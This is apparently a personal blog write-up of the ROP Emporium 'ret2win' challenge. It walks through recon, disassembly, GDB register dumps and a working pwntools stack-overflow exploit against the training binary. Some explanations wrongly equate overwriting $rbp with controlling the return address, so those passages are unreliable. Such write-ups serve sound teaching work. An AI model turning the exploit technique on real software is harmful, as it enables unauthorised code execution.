@@ -1,0 +1,474 @@
+#+title: ROPemporium | ret2win
+#+date: <2021-03-22 11:55>
+#+filetags: ROPemporium overflow write-up exploitation
+
+* Introduction
+Welcome to this little write-up on the very first challenge from ROPemporium.
+
+ROPemporium is a platform for learning the mystic art of return-oriented programming(ROP).
+This is accomplished by going through 8 challenges in total, with increasing diffyculty.
+
+But before we begin this little eight-part adventure, let's take a closer look at what ROP is for a thing.
+
+** Buffer overflows
+I know that I just said i would explain ROP, but before we get into that.
+Let us quickly brushup on what a buffer overflow is.
+
+According to the very first paragraph on [[https://en.wikipedia.org/wiki/Buffer_overflow][wikipedia]]:
+#+begin_quote
+In information security and programming, a buffer overflow, or buffer overrun, is an anomaly where a program, while writing data to a buffer, overruns the buffer's boundary and overwrites adjacent memory locations.
+#+end_quote
+
+So buffer overflows happens when it is possible to put more data into a variable thereby overwriting other memory adresses.
+
+But why is this dangerous??
+
+Because we can manipulate the content in the different registers.
+And through this execute abitriary code.
+
+Again this was a veeeery short overview, if you want to read more about buffer overflows, and I recommend that you do, here is a list of resources on the subject:
+- [[https://blog.rapid7.com/2019/02/19/stack-based-buffer-overflow-attacks-what-you-need-to-know/][Rapid7 - Stack-Based]] :: Explained with Examples
+- [[https://0xrick.github.io/][0xrick]] :: Look at his basic binary series
+- [[https://github.com/Tzaoh/pwning][Tzaoh's pwning list]] :: Huge list of resources on all kinds of exploitation
+- [[https://pwn.college/][pwn.college]] :: A free and opensource exploitation course
+
+Eventually I'll create a series focused just on buffer overflows, but for now you'll have to make do.
+
+** Return Oriented Programming
+Again we look towards Wikipedia for more knowledge.
+The first paragraph on [[https://en.wikipedia.org/wiki/Return-oriented_programming][Wikipedia]]:
+#+begin_quote
+Return-oriented programming (ROP) is a computer security exploit technique that allows an attacker to execute code in the presence of security defenses such as executable space protection and code signing.
+#+end_quote
+
+The basic principle for ROP is that we can control which function we return to when we land on a ~ret~ instruction.
+There is also the topic of gadgets, but I'll explain that in the ~split~ write-up.
+
+But how does one control which the software will return to?
+
+That is exactly what this challenge is about.
+
+* Recon
+Before anything is done you should always to some reconnaissance on your target.
+The more you know about the target, the easier it will be to model an attack towards it.
+** File
+The first thing you should do with any compiled binary that you want to pwn(professionel language for defeating security), is to run the ~file~ command on the the binary.
+#+begin_example
+┌────[~/ha/bi/ropemporium/ret2win on  master [?]
+└─>file ret2win
+ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped
+#+end_example
+What this tells us is that the binary ~ret2win~ is a 64-bit ELF file.
+
+It is not stripped, which means that if there is any debugging information in the code, we should be able to see it.
+It also means symbols are left in so we can see function names.
+
+** Checksec
+After looking at what ~file~ gives outputs, the next nifty tool we should use is: ~checksec~.
+It is a part of ~pwntools~, [[https://github.com/Gallopsled/pwntools][a CTF framework and exploit development library]], and can tell us about what kind of security measures that the binary is compiled with.
+#+begin_example
+┌────[~/ha/bi/ropemporium/ret2win on  master [?]
+└─>checksec ret2win
+[*] '/home/c3lphie/hacking/binary_exploitation/ropemporium/ret2win/ret2win'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+#+end_example
+Here we see that there is basically no security measures put in place... Which one would expect on the very first challenge.
+But what is it that we see here?
+
+- Arch :: This is the Architecture for which the binary was compiled for. In this case we see that it is ~amd64-64-little~ I'll break this down further in a minute.
+- RELRO :: A security measure which makes some binary sections read-only. Partial RELRO means basically nothing for us. Full RELRO is a lot more secure, but I'll tackle this when I encounter it.
+- Stack :: This tells us if there are any canaries compiled into the binary. Canaries are a security measure that protect from stack smashing attacks... Like what we're doing here. Not that they can't be handled
+- NX :: A technology which splits the areas of memory up so that data can't be executed. This is the security measure we bypass using ROP
+- PIE :: If this was enabled, the binary would have been loaded randomly into memory making it harder to exploit. But this is not something we need to worry about.
+
+The architecture this binary was compiled for was ~amd64-64-little~, let's split this up into two.
+~amd64-64~ means that it's for a 64 bit system.
+~-little~ tells us that is for a little endian system.
+Which you can read more about [[https://www.section.io/engineering-education/what-is-little-endian-and-big-endian/][here]].
+
+** Binary ninja
+Now there are probably a ton of other tools that you could use to find other things about the binary.
+But at this point I know enough about the target for now.
+
+I have chosen [[https://binary.ninja/][Binary ninja]] for reverse engineering software.
+But use what-ever you're most comfortable in, and if you don't have the economy to buy a piece of software, then there are opensource software available like [[https://cutter.re/][cutter]] or [[https://ghidra-sre.org/][ghidra]](if you're not afraid of the NSA ;)).
+*** Main function
+#+caption: main function disassembled 
+#+begin_src asm
+  push    rbp {__saved_rbp}
+  mov     rbp, rsp {__saved_rbp}
+  mov     rax, qword [rel stdout]
+  mov     ecx, 0x0
+  mov     edx, 0x2
+  mov     esi, 0x0
+  mov     rdi, rax
+  call    setvbuf
+  mov     edi, 0x400808  {"ret2win by ROP Emporium"}
+  call    puts
+  mov     edi, 0x400820  {"x86_64\n"}
+  call    puts
+  mov     eax, 0x0
+  call    pwnme
+  mov     edi, 0x400828  {"\nExiting"}
+  call    puts
+  mov     eax, 0x0
+  pop     rbp {__saved_rbp}
+  retn     {__return_addr}
+#+end_src
+Here we see the main function disassembled, there isn't anything interesting to see.
+What we want is the function pwnme, which is called on line 14.
+So let's take a look at that instead shall we?
+*** pwnme function
+#+caption: pwnme function disassembled
+#+begin_src asm
+  push    rbp {__saved_rbp}
+  mov     rbp, rsp {__saved_rbp}
+  sub     rsp, 0x20
+  lea     rax, [rbp-0x20 {var_28}]
+  mov     edx, 0x20
+  mov     esi, 0x0
+  mov     rdi, rax {var_28}
+  call    memset
+  mov     edi, 0x400838  {"For my first trick, I will attem…"}
+  call    puts
+  mov     edi, 0x400898  {"What could possibly go wrong?"}
+  call    puts
+  mov     edi, 0x4008b8  {"You there, may I have your input…"}
+  call    puts
+  mov     edi, 0x400918
+  mov     eax, 0x0
+  call    printf
+  lea     rax, [rbp-0x20 {var_28}]
+  mov     edx, 0x38
+  mov     rsi, rax {var_28}
+  mov     edi, 0x0
+  call    read
+  mov     edi, 0x40091b  {"Thank you!"}
+  call    puts
+  nop     
+  leave    {__saved_rbp}
+  retn     {__return_addr}
+#+end_src
+
+Since this is the function, which should be pwned, lets take a closer look using binary ninjas HLIL.
+I know I shouldn't rely on it, but I'm still learning so yeah.
+#+caption: pwnme function HLIL
+#+begin_src c
+  void var_28
+  memset(&var_28, 0, 0x20)
+  puts(str: "For my first trick, I will attem…")
+  puts(str: "What could possibly go wrong?")
+  puts(str: "You there, may I have your input…")
+  printf(format: data_400918)
+  read(fd: 0, buf: &var_28, nbytes: 0x38)
+  return puts(str: "Thank you!")
+#+end_src
+
+Let's clean it up a bit for easier understanding:
+#+caption: pwnme function HLIL with var names
+#+begin_src c
+  void buffer
+  memset(&buffer, 0, 32)
+  puts(str: "For my first trick, I will attem…")
+  puts(str: "What could possibly go wrong?")
+  puts(str: "You there, may I have your input…")
+  printf(format: data_400918)
+  read(fd: 0, buf: &buffer, nbytes: 56)
+  return puts(str: "Thank you!")
+#+end_src
+
+As we can see we have a buffer with the size 32 bytes, but the read call accepts up to 56 bytes.
+This means that we can overflow the buffer and control the stack.
+But how should we control the stack?
+
+Well if you look at the last two lines of the disassembly version of ~pwnme~
+#+begin_src asm
+  leave    {__saved_rbp}
+  retn     {__return_addr}
+#+end_src
+If we somehow managed to overwrite ~__return_addr~ we potentially have the ability to make arbitrary code calls.
+
+*** ret2win function
+#+caption: ret2win function disassembled
+#+begin_src asm
+  push    rbp {__saved_rbp}
+  mov     rbp, rsp {__saved_rbp}
+  mov     edi, 0x400926  {"Well done! Here's your flag:"}
+  call    puts
+  mov     edi, 0x400943  {"/bin/cat flag.txt"}
+  call    system
+  nop     
+  pop     rbp {__saved_rbp}
+  retn     {__return_addr}
+#+end_src
+This is the function we must aim the ~ret~ instruction towards in the ~pwnme~ function
+
+And as we can see it just executes ~/bin/cat flag.txt~ on the system.
+
+* Exploit
+When writing the actual exploit I used 3 tools: ~emacs~, a ~terminal~ and ~gdb~.
+The first one being my text editor ;), the second is pretty self explanatory and the last is Gnu Debugger.
+
+** Overflowing the buffer
+As I wrote earlier we need to do a bufferoverflow.
+We know that from Binary Ninja that we have an input buffer that is 32 bytes long.
+But the ~read~ function can read up to 56 bytes into the buffer.
+
+So lets see what happen if we put a bunch of data into the buffer!
+#+begin_example
+┌────[~/ha/bi/ropemporium/ret2win on  master [?]
+└─>./ret2win
+ret2win by ROP Emporium
+x86_64
+
+For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
+What could possibly go wrong?
+You there, may I have your input please? And don't worry about null bytes, we're using read()!
+
+> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Thank you!
+zsh: segmentation fault (core dumped)  ./ret2win
+#+end_example
+And we crashed!
+But why?
+
+If we try again, but run ~ret2win~ with ~gdb~ attached we can see what happens to the registers.
+I have set a break point on the ~leave~ instruction just before the ~ret~ instruction.
+And a couple of instructions before the ~read~ call.
+
+If we look at the registers before ~read~.
+#+begin_example
+[ Legend: Modified register | Code | Heap | Stack | String ]
+────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x2
+$rbx   : 0x0000000000400780  →  <__libc_csu_init+0> push r15
+$rcx   : 0x0
+$rdx   : 0x0
+$rsp   : 0x00007fffffffe040  →  0x0000000000000000
+$rbp   : 0x00007fffffffe060  →  0x00007fffffffe070  →  0x0000000000000000
+$rsi   : 0x00007fffffffbf20  →  0x000000000000203e ("> "?)
+$rdi   : 0x00007ffff7f8f4d0  →  0x0000000000000000
+$rip   : 0x0000000000400733  →  <pwnme+75> lea rax, [rbp-0x20]
+$r8    : 0x60
+$r9    : 0x00007ffff7fdc070  →  <_dl_fini+0> endbr64
+$r10   : 0x0000000000400918  →  0x6b6e61685400203e ("> "?)
+$r11   : 0x246
+$r12   : 0x00000000004005b0  →  <_start+0> xor ebp, ebp
+$r13   : 0x0
+$r14   : 0x0
+$r15   : 0x0
+$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
+#+end_example
+The two registers we are interested in are ~$rsp~ and ~$rbp~.
+
+~$rsp~ is the stack pointer, it points to addresses in the stack where the buffer is stored.
+~$rbp~ is the base pointer, it points to the memory address which is the "base" for the function.
+When returning from a function, we will land where ~$rbp~ points to.
+
+So lets crash this program!
+#+begin_example
+gef➤  run
+Starting program: /home/c3lphie/hacking/binary_exploitation/ropemporium/ret2win/ret2win
+ret2win by ROP Emporium
+x86_64
+
+For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
+What could possibly go wrong?
+You there, may I have your input please? And don't worry about null bytes, we're using read()!
+
+> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+#+end_example
+Here I just run it in GDB, and wrote a bunch of A's before hitting enter.
+Don't mind the gef➤ prompt, that is just a gdb extension which makes exploit development easier.
+
+Below you can see the content of the registers after the crash.
+#+begin_example
+[ Legend: Modified register | Code | Heap | Stack | String ]
+────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0xb
+$rbx   : 0x0000000000400780  →  <__libc_csu_init+0> push r15
+$rcx   : 0x00007ffff7ebb0f7  →  0x5177fffff0003d48 ("H="?)
+$rdx   : 0x0
+$rsp   : 0x00007fffffffe040  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$rbp   : 0x00007fffffffe060  →  0x4141414141414141 ("AAAAAAAA"?)
+$rsi   : 0x00007ffff7f8d5a3  →  0xf8f4d0000000000a
+$rdi   : 0x00007ffff7f8f4d0  →  0x0000000000000000
+$rip   : 0x0000000000400754  →  <pwnme+108> leave
+$r8    : 0xb
+$r9    : 0x00007ffff7fdc070  →  <_dl_fini+0> endbr64
+$r10   : 0xfffffffffffffb8b
+$r11   : 0x246
+$r12   : 0x00000000004005b0  →  <_start+0> xor ebp, ebp
+$r13   : 0x0
+$r14   : 0x0
+$r15   : 0x0
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
+#+end_example
+The hexadecimal value for A is 0x41 when ascii encoded.
+And as you can see we managed to overwrite ~$rbp~, so now we just need to control ~$rbp~ to point to the ~ret2win~ function.
+
+To do this we need to figure out how much data to insert before address.
+
+*** Cyclic patterns
+Using cyclic patterns, we can relatively easy find the padding length of our payload.
+
+#+begin_src python 
+  from pwn import *
+
+  context.update(arch="amd64", os="linux")
+  proc = process("./ret2win")
+  gdb.attach(proc, """
+  b pwnme""")
+
+  def send_recv(buffer: bytes):
+      proc.recvuntil(b">")
+      proc.sendline(buffer)
+      return proc.recvline()
+
+  payload = cyclic(56)
+
+  send_recv(payload)
+  proc.interactive()
+#+end_src
+
+Here I used the ~cyclic~ function, from pwntools, to generate a 56 character long [[https://en.wikipedia.org/wiki/De_Bruijn_sequence][de Bruijn sequence]].
+Which we can use to find our padding length
+
+The above script also attaches gdb, so we can find the pattern in the registers and use that in our exploit.
+#+begin_example
+[ Legend: Modified register | Code | Heap | Stack | String ]
+────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0xb
+$rbx   : 0x0000000000400780  →  <__libc_csu_init+0> push r15
+$rcx   : 0x00007fc84be920f7  →  0x5177fffff0003d48 ("H="?)
+$rdx   : 0x0
+$rsp   : 0x00007ffdaa836178  →  0x6161616c6161616b ("kaaalaaa"?)
+$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
+$rsi   : 0x00007fc84bf645a3  →  0xf664d0000000000a
+$rdi   : 0x00007fc84bf664d0  →  0x0000000000000000
+$rip   : 0x0000000000400755  →  <pwnme+109> ret
+$r8    : 0xb
+$r9    : 0x00007fc84bfad070  →  <_dl_fini+0> endbr64
+$r10   : 0xfffffffffffffb8b
+$r11   : 0x246
+$r12   : 0x00000000004005b0  →  <_start+0> xor ebp, ebp
+$r13   : 0x0
+$r14   : 0x0
+$r15   : 0x0
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
+#+end_example
+
+And as you can see ~$rbp~ has some sort of weird string.
+If we use the function ~cyclic_find~ in conjunction with ~cyclic~ we can find the padding for the exploit.
+
+#+begin_src python
+  from pwn import *
+
+  context.update(arch="amd64", os="linux")
+  proc = process("./ret2win")
+  gdb.attach(proc, """
+  b pwnme""")
+
+  def send_recv(buffer: bytes):
+      proc.recvuntil(b">")
+      proc.sendline(buffer)
+      return proc.recvline()
+
+  payload = cyclic(cyclic_find(0x61616169))
+  payload += p64(0xdeadbeefcafebabe)
+
+  send_recv(payload)
+  proc.interactive()
+#+end_src
+If we concentrate on the payload, we see that we first calculate our padding.
+After that we add ~0xdeadbeecafebabe~ to ensure that we indeed do have control over ~$rbp~.
+
+#+begin_example
+[ Legend: Modified register | Code | Heap | Stack | String ]
+────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0xb
+$rbx   : 0x0000000000400780  →  <__libc_csu_init+0> push r15
+$rcx   : 0x00007fa3497a50f7  →  0x5177fffff0003d48 ("H="?)
+$rdx   : 0x0
+$rsp   : 0x00007fffb9d3f2d0  →  0x0000000000000000
+$rbp   : 0xdeadbeefcafebabe
+$rsi   : 0x00007fa3498775a3  →  0x8794d0000000000a
+$rdi   : 0x00007fa3498794d0  →  0x0000000000000000
+$rip   : 0x000000000040060a  →  <deregister_tm_clones+26> or eax, 0x1058bf5d
+$r8    : 0xb
+$r9    : 0x00007fa3498c0070  →  <_dl_fini+0> endbr64
+$r10   : 0xfffffffffffffb8b
+$r11   : 0x246
+$r12   : 0x00000000004005b0  →  <_start+0> xor ebp, ebp
+$r13   : 0x0
+$r14   : 0x0
+$r15   : 0x0
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
+#+end_example
+And if I could point your attention to ~$rbp~, you should see that we have indeed control over the base pointer.
+
+** Useful addresses
+Since we already know which function we need to execute, and the binary doesn't have PIE enabled, I went ahead and grabbed the address from Binary Ninja.
+|---------+----------|
+| Name    |  Address |
+|---------+----------|
+| ret2win | 0x400756 |
+|---------+----------|
+
+** Final exploit
+So know that we have control over the base pointer let's make it point towards ~ret2win~ and finish this challenge.
+#+begin_src python
+  from pwn import *
+
+  context.update(arch="amd64", os="linux")
+  proc = process("./ret2win")
+
+  def send_recv(buffer: bytes):
+      proc.recvuntil(b">")
+      proc.sendline(buffer)
+      return proc.recvline()
+
+
+  ret2win_addr = 0x400756
+
+
+  payload = cyclic(cyclic_find(0x6161616B))
+  payload += p64(ret2win_addr)
+
+  send_recv(payload)
+  proc.interactive()
+#+end_src
+As you can see instead of ~0xdeadbeefcafebabe~ we just use ~ret2win_addr~.
+And if we run the script:
+#+begin_example
+┌────[~/ha/bi/ropemporium/ret2win on  master [?]
+└─>python exploit.py
+[+] Starting local process './ret2win': pid 170719
+[*] Switching to interactive mode
+Well done! Here's your flag:
+ROPE{a_placeholder_32byte_flag!}
+[*] Got EOF while reading in interactive
+$
+[*] Process './ret2win' stopped with exit code -11 (SIGSEGV) (pid 170719)
+[*] Got EOF while sending in interactive
+#+end_example
+
+* Conclusion
+First of all thank you for reading my first proper write-up.
+I hope it won't be the last, as I want to publish a new post/write-up/whatever-you-call-it every other week.
+
+So what did we do here?
+We got a /very/ basic introduction to buffer overflows and ROP, but hopefully enough to you hooked ;).
+We successfully overflowed a buffer which let us control the return address of the function.
+
+My next post will be about ROPemporium split, where we need to make use of so called ROPgadgets.
+
+
